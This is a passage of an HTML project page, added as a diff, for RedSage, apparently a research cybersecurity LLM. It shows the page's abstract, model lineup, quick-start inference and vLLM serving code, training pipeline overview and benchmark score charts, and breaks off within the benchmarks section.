@@ -1,0 +1,1030 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RedSage: A Cybersecurity Generalist LLM</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=JetBrains+Mono:wght@400;700&display=swap"
+        rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'monospace'],
+                    },
+                    colors: {
+                        cyber: {
+                            dark: '#0a0a0c',
+                            card: '#131316',
+                            border: '#27272a',
+                            primary: '#ef4444', // Red 500
+                            accent: '#f97316', // Orange 500
+                            text: '#e4e4e7',
+                            muted: '#a1a1aa'
+                        }
+                    },
+                    animation: {
+                        'blob': 'blob 7s infinite',
+                        'typewriter': 'typewriter 2s steps(40) 1s 1 normal both',
+                    },
+                    keyframes: {
+                        blob: {
+                            '0%': { transform: 'translate(0px, 0px) scale(1)' },
+                            '33%': { transform: 'translate(30px, -50px) scale(1.1)' },
+                            '66%': { transform: 'translate(-20px, 20px) scale(0.9)' },
+                            '100%': { transform: 'translate(0px, 0px) scale(1)' },
+                        },
+                        typewriter: {
+                            'from': { width: '0' },
+                            'to': { width: '100%' }
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            background-color: #0a0a0c;
+            color: #e4e4e7;
+            overflow-x: hidden;
+        }
+
+        .glass {
+            background: rgba(19, 19, 22, 0.7);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid rgba(39, 39, 42, 0.5);
+        }
+
+        .gradient-text {
+            background: linear-gradient(to right, #ef4444, #f97316);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        /* Custom scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #0a0a0c;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #27272a;
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #3f3f46;
+        }
+
+        /* Code block syntax highlighting */
+        .token.comment {
+            color: #6b7280;
+        }
+
+        .token.string {
+            color: #10b981;
+        }
+
+        .token.keyword {
+            color: #ef4444;
+        }
+
+        .token.function {
+            color: #f97316;
+        }
+    </style>
+</head>
+
+<body class="antialiased selection:bg-cyber-primary selection:text-white">
+
+    <!-- Navbar -->
+    <nav class="fixed w-full z-50 glass border-b border-cyber-border/50">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-16">
+                <div class="flex items-center gap-2">
+                    <i data-lucide="shield-alert" class="text-cyber-primary h-6 w-6"></i>
+                    <span class="font-bold text-xl tracking-tight">RedSage</span>
+                </div>
+                <div class="hidden md:block">
+                    <div class="ml-10 flex items-baseline space-x-8">
+                        <a href="#abstract"
+                            class="hover:text-cyber-primary transition-colors px-3 py-2 rounded-md text-sm font-medium">Abstract</a>
+                        <a href="#models"
+                            class="hover:text-cyber-primary transition-colors px-3 py-2 rounded-md text-sm font-medium">Models</a>
+                        <a href="#usage"
+                            class="hover:text-cyber-primary transition-colors px-3 py-2 rounded-md text-sm font-medium">Quick
+                            Start</a>
+                        <a href="#pipeline"
+                            class="hover:text-cyber-primary transition-colors px-3 py-2 rounded-md text-sm font-medium">Pipeline</a>
+                        <a href="#demo"
+                            class="hover:text-cyber-primary transition-colors px-3 py-2 rounded-md text-sm font-medium">Demo</a>
+                    </div>
+                </div>
+                <div>
+                    <a href="https://github.com/RISys-Lab/RedSage" target="_blank"
+                        class="bg-cyber-primary/10 hover:bg-cyber-primary/20 text-cyber-primary border border-cyber-primary/20 px-4 py-2 rounded-full text-sm font-medium transition-all flex items-center gap-2">
+                        <i data-lucide="github" class="h-4 w-4"></i>
+                        Repo
+                    </a>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="relative pt-32 pb-20 lg:pt-48 lg:pb-32 overflow-hidden">
+        <!-- Background Glows -->
+        <div
+            class="absolute top-0 -left-4 w-72 h-72 bg-cyber-primary rounded-full mix-blend-multiply filter blur-[128px] opacity-20 animate-blob">
+        </div>
+        <div
+            class="absolute top-0 -right-4 w-72 h-72 bg-cyber-accent rounded-full mix-blend-multiply filter blur-[128px] opacity-20 animate-blob animation-delay-2000">
+        </div>
+
+        <div class="relative max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
+            <!-- <div
+                class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-cyber-card border border-cyber-border mb-8">
+                <span class="w-2 h-2 rounded-full bg-red-500 animate-pulse"></span>
+                <span class="text-xs font-mono text-cyber-muted uppercase tracking-wider">Under Review @ ICLR
+                    2026</span>
+            </div> -->
+
+            <h1 class="text-5xl md:text-7xl font-extrabold tracking-tight mb-4">
+                RedSage: <br class="hidden md:block" />
+                <span class="gradient-text">Cybersecurity Generalist LLM</span>
+            </h1>
+
+            <!-- Authors -->
+            <div class="text-cyber-muted text-sm md:text-base max-w-5xl mx-auto mb-4 font-light leading-relaxed">
+                Naufal Suryanto<sup>1</sup>, Muzammal Naseer<sup>1,†</sup>, Pengfei Li<sup>1</sup>, <br
+                    class="hidden md:block">
+                Syed Talal Wasim<sup>2</sup>, Jinhui Yi<sup>2</sup>, Juergen Gall<sup>2</sup>, <br
+                    class="hidden md:block">
+                Paolo Ceravolo<sup>3</sup>, Ernesto Damiani<sup>3</sup>
+            </div>
+
+            <!-- Affiliations -->
+            <div
+                class="text-cyber-muted/60 text-xs max-w-4xl mx-auto mb-8 font-light flex flex-wrap justify-center gap-x-6 gap-y-2">
+                <span><sup>1</sup> Khalifa University</span>
+                <span><sup>2</sup> Universität Bonn</span>
+                <span><sup>3</sup> University of Milan</span>
+                <span class="w-full mt-2 text-cyber-primary/80"><sup>†</sup> Project Lead</span>
+            </div>
+
+            <div class="flex flex-wrap justify-center gap-2 mb-6 opacity-80">
+                <a href="https://openreview.net/forum?id=W4FAenIrQ2"><img
+                        src="https://img.shields.io/badge/Paper-OpenReview-B31B1B.svg" alt="OpenReview"></a>
+                <a href="https://huggingface.co/RISys-Lab"><img
+                        src="https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-RISys--Lab-orange"
+                        alt="Hugging Face"></a>
+                <img src="https://img.shields.io/badge/Python-3.10%2B-blue" alt="Python">
+                <img src="https://img.shields.io/badge/Framework-PyTorch-ee4c2c" alt="PyTorch">
+            </div>
+
+            <p class="mt-4 max-w-2xl mx-auto text-xl text-cyber-muted leading-relaxed">
+                An open-source, locally deployable 8B model bridging the gap between general knowledge and
+                domain-specific security operations via agentic data augmentation.
+            </p>
+
+            <div class="mt-10 flex flex-col sm:flex-row justify-center gap-4">
+                <a href="https://huggingface.co/collections/RISys-Lab/redsage-models"
+                    class="group relative px-8 py-3 bg-cyber-primary text-white font-semibold rounded-lg hover:bg-red-400 transition-all">
+                    <span
+                        class="absolute inset-0 w-full h-full rounded-lg opacity-0 group-hover:opacity-50 transition-opacity duration-200 bg-white blur"></span>
+                    <span class="relative flex items-center justify-center gap-2">
+                        <i data-lucide="download" class="h-5 w-5"></i> Download Models
+                    </span>
+                </a>
+                <a href="#demo"
+                    class="px-8 py-3 bg-cyber-card border border-cyber-border hover:border-cyber-primary/50 text-white font-semibold rounded-lg transition-all flex items-center justify-center gap-2">
+                    <i data-lucide="terminal" class="h-5 w-5"></i> Our Model Showcase
+                </a>
+            </div>
+
+            <!-- Stats Grid -->
+            <div
+                class="mt-20 grid grid-cols-2 md:grid-cols-4 gap-8 max-w-4xl mx-auto border-t border-cyber-border pt-10">
+                <div>
+                    <div class="text-3xl font-bold text-white">11.8B</div>
+                    <div class="text-sm text-cyber-muted mt-1">Pre-training Tokens</div>
+                </div>
+                <div>
+                    <div class="text-3xl font-bold text-white">266K</div>
+                    <div class="text-sm text-cyber-muted mt-1">SFT Dialogues</div>
+                </div>
+                <div>
+                    <div class="text-3xl font-bold text-white">30K</div>
+                    <div class="text-sm text-cyber-muted mt-1">Benchmark Qs</div>
+                </div>
+                <div>
+                    <div class="text-3xl font-bold text-white">+5.6%</div>
+                    <div class="text-sm text-cyber-muted mt-1">vs. Baselines</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Abstract Section -->
+    <section id="abstract" class="py-20 bg-cyber-card/50">
+        <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
+            <h2 class="text-3xl font-bold mb-8 flex items-center gap-3">
+                <i data-lucide="book-open" class="text-cyber-accent"></i>
+                Abstract
+            </h2>
+            <div class="prose prose-invert prose-lg max-w-none text-cyber-muted leading-relaxed text-justify">
+                <p>
+                    Cybersecurity operations demand assistant LLMs that support diverse workflows without exposing
+                    sensitive data. Existing solutions either rely on proprietary APIs with privacy risks or on open
+                    models lacking domain adaptation. To bridge this gap, we introduce <strong>RedSage</strong>.
+                </p>
+                <p>
+                    We curate 11.8B tokens of cybersecurity-focused continual pretraining data via large-scale web
+                    filtering and manual collection of high-quality resources. Building on this, we design an agentic
+                    augmentation pipeline that simulates expert workflows to generate 266K multi-turn cybersecurity
+                    samples for supervised fine-tuning.
+                </p>
+                <p>
+                    To rigorously evaluate the models, we introduce <strong>RedSage-Bench</strong>, a benchmark with 30K
+                    multiple-choice and 240 open-ended Q&A items. At the 8B scale, RedSage achieves consistently better
+                    results, surpassing baseline models by up to +5.59 points on cybersecurity benchmarks and +5.05
+                    points on Open LLM Leaderboard tasks.
+                </p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Model Lineup Section -->
+    <section id="models" class="py-20 relative border-t border-cyber-border/30">
+        <div class="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8">
+            <h2 class="text-3xl font-bold mb-8 text-center">Model Lineup</h2>
+            <div class="overflow-x-auto">
+                <table class="w-full text-left border-collapse">
+                    <thead>
+                        <tr class="border-b border-cyber-border text-cyber-muted text-sm uppercase tracking-wider">
+                            <th class="py-4 px-6">Model Name</th>
+                            <th class="py-4 px-6">Type</th>
+                            <th class="py-4 px-6">Best For</th>
+                            <th class="py-4 px-6 text-right">Link</th>
+                        </tr>
+                    </thead>
+                    <tbody class="text-sm">
+                        <tr class="border-b border-cyber-border/50 hover:bg-cyber-primary/5 transition-colors">
+                            <td class="py-4 px-6 font-mono font-bold text-white">RedSage-8B-Base</td>
+                            <td class="py-4 px-6 text-cyber-muted">Base</td>
+                            <td class="py-4 px-6 text-cyber-muted">Domain adaptation, further fine-tuning</td>
+                            <td class="py-4 px-6 text-right">
+                                <a href="https://huggingface.co/RISys-Lab/RedSage-Qwen3-8B-Base"
+                                    class="text-cyber-primary hover:text-cyber-accent transition-colors">HuggingFace
+                                    &rarr;</a>
+                            </td>
+                        </tr>
+                        <tr class="border-b border-cyber-border/50 hover:bg-cyber-primary/5 transition-colors">
+                            <td class="py-4 px-6 font-mono font-bold text-white">RedSage-8B-Ins</td>
+                            <td class="py-4 px-6 text-cyber-muted">Instruct</td>
+                            <td class="py-4 px-6 text-cyber-muted">Multi-turn chat, step-by-step explanations</td>
+                            <td class="py-4 px-6 text-right">
+                                <a href="https://huggingface.co/RISys-Lab/RedSage-Qwen3-8B-Ins"
+                                    class="text-cyber-primary hover:text-cyber-accent transition-colors">HuggingFace
+                                    &rarr;</a>
+                            </td>
+                        </tr>
+                        <tr
+                            class="border-b border-cyber-border/50 hover:bg-cyber-primary/5 transition-colors bg-cyber-primary/5">
+                            <td class="py-4 px-6 font-mono font-bold text-white flex items-center gap-2">
+                                RedSage-8B-DPO <span
+                                    class="px-2 py-0.5 rounded text-[10px] bg-cyber-primary text-white">RECOMMENDED</span>
+                            </td>
+                            <td class="py-4 px-6 text-cyber-muted">Chat (Aligned)</td>
+                            <td class="py-4 px-6 text-cyber-muted">Production-ready assistants, aligned behavior</td>
+                            <td class="py-4 px-6 text-right">
+                                <a href="https://huggingface.co/RISys-Lab/RedSage-Qwen3-8B-DPO"
+                                    class="text-cyber-primary hover:text-cyber-accent transition-colors">HuggingFace
+                                    &rarr;</a>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+            <div class="mt-6 flex justify-center gap-6 text-sm">
+                <a href="https://huggingface.co/collections/RISys-Lab/redsage-datasets"
+                    class="text-cyber-muted hover:text-white flex items-center gap-1 transition-colors">
+                    <i data-lucide="database" class="w-4 h-4"></i> Data Collection
+                </a>
+                <a href="https://huggingface.co/collections/RISys-Lab/redsage-benchmarks"
+                    class="text-cyber-muted hover:text-white flex items-center gap-1 transition-colors">
+                    <i data-lucide="bar-chart" class="w-4 h-4"></i> Benchmark Collection
+                </a>
+            </div>
+        </div>
+    </section>
+
+    <!-- Quick Start Section -->
+    <section id="usage" class="py-20 bg-cyber-card border-y border-cyber-border">
+        <div class="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8">
+            <h2 class="text-3xl font-bold mb-8 flex items-center gap-3">
+                <i data-lucide="zap" class="text-cyber-accent"></i>
+                Quick Start
+            </h2>
+
+            <div class="grid md:grid-cols-2 gap-8">
+                <!-- Python Inference -->
+                <div class="glass rounded-xl border border-cyber-border overflow-hidden">
+                    <div class="bg-black/50 px-4 py-3 border-b border-cyber-border flex justify-between items-center">
+                        <span class="text-xs font-mono text-cyber-muted">inference.py</span>
+                        <span class="text-xs text-cyber-primary">Transformers</span>
+                    </div>
+                    <div class="p-4 overflow-x-auto bg-[#0d0d0d]">
+                        <pre class="text-sm font-mono text-gray-300">
+<span class="token keyword">from</span> transformers <span class="token keyword">import</span> AutoModelForCausalLM, AutoTokenizer
+<span class="token keyword">import</span> torch
+
+model_name = <span class="token string">"RISys-Lab/RedSage-Qwen3-8B-Ins"</span>
+
+tok = AutoTokenizer.from_pretrained(model_name)
+model = AutoModelForCausalLM.from_pretrained(
+    model_name, 
+    torch_dtype=torch.bfloat16, 
+    device_map=<span class="token string">"auto"</span>
+)
+
+messages = [
+  {<span class="token string">"role"</span>: <span class="token string">"system"</span>, <span class="token string">"content"</span>: <span class="token string">"You are RedSage."</span>},
+  {<span class="token string">"role"</span>: <span class="token string">"user"</span>, <span class="token string">"content"</span>: <span class="token string">"List three SSRF mitigations."</span>}
+]
+
+text = tok.apply_chat_template(messages, tokenize=<span class="token keyword">False</span>)
+inputs = tok(text, return_tensors=<span class="token string">"pt"</span>).to(model.device)
+out = model.generate(**inputs, max_new_tokens=300)
+<span class="token function">print</span>(tok.decode(out[0]))
+</pre>
+                    </div>
+                </div>
+
+                <!-- vLLM Serving -->
+                <div class="glass rounded-xl border border-cyber-border overflow-hidden flex flex-col">
+                    <div class="bg-black/50 px-4 py-3 border-b border-cyber-border flex justify-between items-center">
+                        <span class="text-xs font-mono text-cyber-muted">bash</span>
+                        <span class="text-xs text-cyber-primary">vLLM Serving</span>
+                    </div>
+                    <div class="p-4 overflow-x-auto bg-[#0d0d0d] flex-grow">
+                        <pre class="text-sm font-mono text-gray-300">
+<span class="token comment"># 1. Install vLLM</span>
+uv pip install vllm --torch-backend=auto
+
+<span class="token comment"># 2. Start the OpenAI-compatible server</span>
+vllm serve RISys-Lab/RedSage-Qwen3-8B-DPO \
+  --port 8000 \
+  --max-model-len 32768
+
+<span class="token comment"># 3. Query via curl</span>
+curl http://localhost:8000/v1/chat/completions \
+  -H <span class="token string">"Content-Type: application/json"</span> \
+  -d '{
+    <span class="token string">"model"</span>: <span class="token string">"RISys-Lab/RedSage-Qwen3-8B-DPO"</span>,
+    <span class="token string">"messages"</span>: [
+      {<span class="token string">"role"</span>: <span class="token string">"user"</span>, <span class="token string">"content"</span>: <span class="token string">"Explain CTI."</span>}
+    ]
+  }'
+</pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Pipeline Section -->
+    <section id="pipeline" class="py-20 relative">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center mb-16">
+                <h2 class="text-3xl font-bold mb-4">The RedSage Pipeline</h2>
+                <p class="text-cyber-muted max-w-2xl mx-auto">From raw web data to a specialized assistant via
+                    multi-stage training.</p>
+            </div>
+
+            <div class="grid md:grid-cols-3 gap-8 relative">
+                <!-- Connecting Line (Desktop) -->
+                <div
+                    class="hidden md:block absolute top-1/2 left-0 w-full h-0.5 bg-gradient-to-r from-cyber-primary/0 via-cyber-primary/30 to-cyber-primary/0 -translate-y-1/2 z-0">
+                </div>
+
+                <!-- Stage 1 -->
+                <div
+                    class="relative z-10 glass p-8 rounded-2xl border border-cyber-border hover:border-cyber-primary/50 transition-colors group">
+                    <div
+                        class="w-12 h-12 bg-cyber-card rounded-xl border border-cyber-primary/30 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
+                        <i data-lucide="database" class="text-cyber-primary"></i>
+                    </div>
+                    <h3 class="text-xl font-bold mb-2">1. Pre-Training</h3>
+                    <p class="text-sm text-cyber-muted mb-4">CyberFineWeb (11.8B Tokens) + RedSage Seed (28K Docs)</p>
+                    <ul class="text-sm text-cyber-muted space-y-2 list-disc list-inside">
+                        <li>Filtered CommonCrawl</li>
+                        <li>MITRE, OWASP, NIST</li>
+                        <li>Offensive Security Writeups</li>
+                    </ul>
+                </div>
+
+                <!-- Stage 2 -->
+                <div
+                    class="relative z-10 glass p-8 rounded-2xl border border-cyber-border hover:border-cyber-accent/50 transition-colors group">
+                    <div
+                        class="w-12 h-12 bg-cyber-card rounded-xl border border-cyber-accent/30 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
+                        <i data-lucide="bot" class="text-cyber-accent"></i>
+                    </div>
+                    <h3 class="text-xl font-bold mb-2">2. Agentic SFT</h3>
+                    <p class="text-sm text-cyber-muted mb-4">266K Multi-turn Conversations</p>
+                    <ul class="text-sm text-cyber-muted space-y-2 list-disc list-inside">
+                        <li>Planner Agent Strategies</li>
+                        <li>Simulated Expert Workflows</li>
+                        <li>General Instruction Mixing</li>
+                    </ul>
+                </div>
+
+                <!-- Stage 3 -->
+                <div
+                    class="relative z-10 glass p-8 rounded-2xl border border-cyber-border hover:border-purple-500/50 transition-colors group">
+                    <div
+                        class="w-12 h-12 bg-cyber-card rounded-xl border border-purple-500/30 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
+                        <i data-lucide="trophy" class="text-purple-400"></i>
+                    </div>
+                    <h3 class="text-xl font-bold mb-2">3. Evaluation</h3>
+                    <p class="text-sm text-cyber-muted mb-4">RedSage-Bench + Public Benchmarks</p>
+                    <ul class="text-sm text-cyber-muted space-y-2 list-disc list-inside">
+                        <li>30K MCQs (Knowledge/Skills)</li>
+                        <li>240 Open-ended Q&A</li>
+                        <li>LLM-as-a-Judge Rubric</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Capabilities Showcase Section -->
+    <section id="demo" class="py-20 bg-cyber-card border-y border-cyber-border">
+        <div class="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex flex-col md:flex-row items-center justify-between mb-12">
+                <div>
+                    <h2 class="text-3xl font-bold mb-2">Capabilities Showcase</h2>
+                    <p class="text-cyber-muted">Select an example below to view static model outputs (RedSage-8B-DPO).
+                    </p>
+                </div>
+                <div class="flex gap-2 mt-4 md:mt-0 flex-wrap justify-center">
+                    <button onclick="loadScenario('koadic')"
+                        class="px-4 py-2 text-sm bg-cyber-border rounded hover:bg-cyber-border/80 transition-colors active-scenario"
+                        id="btn-koadic">Example: Tool Usage</button>
+                    <button onclick="loadScenario('olympic')"
+                        class="px-4 py-2 text-sm bg-transparent border border-cyber-border rounded hover:bg-cyber-border/50 transition-colors"
+                        id="btn-olympic">Example: Threat Intel</button>
+                    <button onclick="loadScenario('csp')"
+                        class="px-4 py-2 text-sm bg-transparent border border-cyber-border rounded hover:bg-cyber-border/50 transition-colors"
+                        id="btn-csp">Example: CSP Bypass</button>
+                </div>
+            </div>
+
+            <!-- Terminal Window -->
+            <div
+                class="w-full bg-[#0d0d0d] rounded-lg shadow-2xl border border-cyber-border overflow-hidden font-mono text-sm">
+                <!-- Terminal Header -->
+                <div class="bg-[#1a1a1a] px-4 py-2 flex items-center gap-2 border-b border-cyber-border">
+                    <div class="w-3 h-3 rounded-full bg-red-500"></div>
+                    <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+                    <div class="w-3 h-3 rounded-full bg-green-500"></div>
+                    <span class="ml-2 text-cyber-muted text-xs">redsage-8b-dpo — example_log — 80x24</span>
+                    <span
+                        class="ml-auto text-xs text-cyber-muted/50 border border-cyber-muted/20 px-2 py-0.5 rounded">READ
+                        ONLY</span>
+                </div>
+
+                <!-- Terminal Body -->
+                <div class="p-6 min-h-[400px] flex flex-col gap-4" id="terminal-content">
+                    <!-- Content injected via JS -->
+                </div>
+
+                <!-- Input Area -->
+                <div class="p-4 border-t border-cyber-border bg-[#1a1a1a]/50 flex items-center gap-2">
+                    <span class="text-cyber-primary">❯</span>
+                    <span class="animate-pulse w-2 h-4 bg-cyber-primary block"></span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Benchmarks Section -->
+    <section id="benchmarks" class="py-20">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <h2 class="text-3xl font-bold mb-16 text-center">Benchmark Performance</h2>
+
+            <!-- Base Model Performance -->
+            <div class="mb-16">
+                <h3 class="text-xl font-semibold mb-6 flex items-center gap-2 text-cyber-muted">
+                    <i data-lucide="box" class="w-5 h-5"></i>
+                    Base Models
+                </h3>
+                <div class="grid lg:grid-cols-3 gap-8">
+                    <!-- RedSage Bench Chart (Base) -->
+                    <div class="glass p-6 rounded-xl border border-cyber-border">
+                        <h3 class="text-lg font-semibold mb-6 flex items-center gap-2">
+                            <i data-lucide="bar-chart-2" class="text-cyber-primary"></i>
+                            RedSage-Bench <br> (MCQs)
+                        </h3>
+                        <div class="space-y-4 font-mono text-sm">
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>RedSage-8B-Base</span>
+                                    <span class="text-cyber-primary">85.05%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-gradient-to-r from-cyber-primary to-orange-400 h-2 rounded-full"
+                                        style="width: 85.05%"></div>
+                                </div>
+                            </div>
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>Qwen3-8B-Base</span>
+                                    <span class="text-cyber-muted">84.24%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-cyber-muted/50 h-2 rounded-full" style="width: 84.24%"></div>
+                                </div>
+                            </div>
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>Foundation-Sec-8B</span>
+                                    <span class="text-cyber-muted">78.51%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-cyber-muted/30 h-2 rounded-full" style="width: 78.51%"></div>
+                                </div>
+                            </div>
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>Llama-3.1-8B</span>
+                                    <span class="text-cyber-muted">78.02%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-cyber-muted/20 h-2 rounded-full" style="width: 78.02%"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Related Cybersecurity Benchmarks (Base) -->
+                    <div class="glass p-6 rounded-xl border border-cyber-border">
+                        <h3 class="text-lg font-semibold mb-6 flex items-center gap-2">
+                            <i data-lucide="shield-check" class="text-blue-400"></i>
+                            Related Cybersecurity <br> Benchmarks (5-shots)
+                        </h3>
+                        <div class="space-y-4 font-mono text-sm">
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>RedSage-8B-Base</span>
+                                    <span class="text-blue-400">84.56%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-gradient-to-r from-blue-500 to-cyan-400 h-2 rounded-full"
+                                        style="width: 84.56%"></div>
+                                </div>
+                            </div>
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>Qwen3-8B-Base</span>
+                                    <span class="text-cyber-muted">80.81%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-cyber-muted/50 h-2 rounded-full" style="width: 80.81%"></div>
+                                </div>
+                            </div>
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>Foundation-Sec-8B</span>
+                                    <span class="text-cyber-muted">76.90%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-cyber-muted/30 h-2 rounded-full" style="width: 76.90%"></div>
+                                </div>
+                            </div>
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>Llama-3.1-8B</span>
+                                    <span class="text-cyber-muted">75.44%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-cyber-muted/20 h-2 rounded-full" style="width: 75.44%"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Open LLM Leaderboard (Base) -->
+                    <div class="glass p-6 rounded-xl border border-cyber-border">
+                        <h3 class="text-lg font-semibold mb-6 flex items-center gap-2">
+                            <i data-lucide="globe" class="text-cyber-accent"></i>
+                            General Capabilities <br> (Open LLM Leaderboard)
+                        </h3>
+                        <div class="space-y-4 font-mono text-sm">
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>Qwen3-8B-Base</span>
+                                    <span class="text-cyber-accent">70.86%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-gradient-to-r from-cyber-accent to-yellow-500 h-2 rounded-full"
+                                        style="width: 70.86%"></div>
+                                </div>
+                            </div>
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>RedSage-8B-Base</span>
+                                    <span class="text-cyber-muted">69.23%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-cyber-muted/50 h-2 rounded-full" style="width: 69.23%"></div>
+                                </div>
+                            </div>
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>Llama-3.1-8B</span>
+                                    <span class="text-cyber-muted">61.15%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-cyber-muted/30 h-2 rounded-full" style="width: 61.15%"></div>
+                                </div>
+                            </div>
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>Foundation-Sec-8B</span>
+                                    <span class="text-cyber-muted">60.24%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-cyber-muted/20 h-2 rounded-full" style="width: 60.24%"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Instruct/Chat Models -->
+            <div>
+                <h3 class="text-xl font-semibold mb-6 flex items-center gap-2 text-cyber-primary">
+                    <i data-lucide="message-square" class="w-5 h-5"></i>
+                    Instruct & Chat Models
+                </h3>
+                <div class="grid lg:grid-cols-3 gap-8">
+                    <!-- RedSage Bench Chart -->
+                    <div class="glass p-6 rounded-xl border border-cyber-border">
+                        <h3 class="text-lg font-semibold mb-6 flex items-center gap-2">
+                            <i data-lucide="bar-chart-2" class="text-cyber-primary"></i>
+                            RedSage-Bench <br> (MCQs)
+                        </h3>
+
+                        <div class="space-y-4 font-mono text-sm">
+                            <!-- RedSage -->
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>RedSage-8B-Ins</span>
+                                    <span class="text-cyber-primary">85.73%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-gradient-to-r from-cyber-primary to-orange-400 h-2 rounded-full"
+                                        style="width: 85.73%"></div>
+                                </div>
+                            </div>
+                            <!-- Qwen3 -->
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>Qwen3-8B</span>
+                                    <span class="text-cyber-muted">81.85%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-cyber-muted/50 h-2 rounded-full" style="width: 81.85%"></div>
+                                </div>
+                            </div>
+                            <!-- Foundation-Sec -->
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>Foundation-Sec-8B-Ins</span>
+                                    <span class="text-cyber-muted">76.90%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-cyber-muted/30 h-2 rounded-full" style="width: 76.9%"></div>
+                                </div>
+                            </div>
+                            <!-- Llama-3.1 -->
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>Llama-3.1-8B-Ins</span>
+                                    <span class="text-cyber-muted">75.44%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-cyber-muted/20 h-2 rounded-full" style="width: 75.44%"></div>
+                                </div>
+                            </div>
+                            <!-- Llama-Primus -->
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>Llama-Primus-Base</span>
+                                    <span class="text-cyber-muted">71.69%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-cyber-muted/10 h-2 rounded-full" style="width: 71.69%"></div>
+                                </div>
+                            </div>
+                        </div>
+                        <p class="text-[10px] text-cyber-muted mt-6 italic">
+                            *Evaluation on 30K domain-specific MCQs covering knowledge, skills, and tools.
+                        </p>
+                    </div>
+
+                    <!-- Related Cybersecurity Benchmarks -->
